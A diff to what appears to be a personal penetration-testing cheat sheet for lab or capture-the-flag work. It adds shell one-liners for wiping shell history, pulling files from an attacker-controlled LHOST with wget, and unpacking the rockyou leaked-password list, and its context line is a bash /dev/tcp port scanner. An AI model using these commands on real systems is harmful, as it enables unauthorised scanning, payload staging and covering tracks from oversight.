@@ -17,3 +17,18 @@ for i in {1..65535}; do (echo > /dev/tcp/<IP>/$i) >/dev/null 2>&1 && echo $i is 
 
 # latest apache access logs
 tail -f /var/log/apache2/access.log
+
+# clear history
+history -c && history -w
+rm ~/.zsh_history
+
+# download wget
+wget http://<LHOST>/<PATH>
+
+# download wget rename
+wget http://<LHOST>/<PATH> -O <NEWFILE>
+
+# rockyou.txt
+sudo tar xvzf /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.tar.gz -C /usr/share/seclists/Passwords/Leaked-Databases/
+
+$ LHOST: ip -f inet addr show tun0 | sed -En -e 's/.*inet ([0-9.]+).*/\1/p'
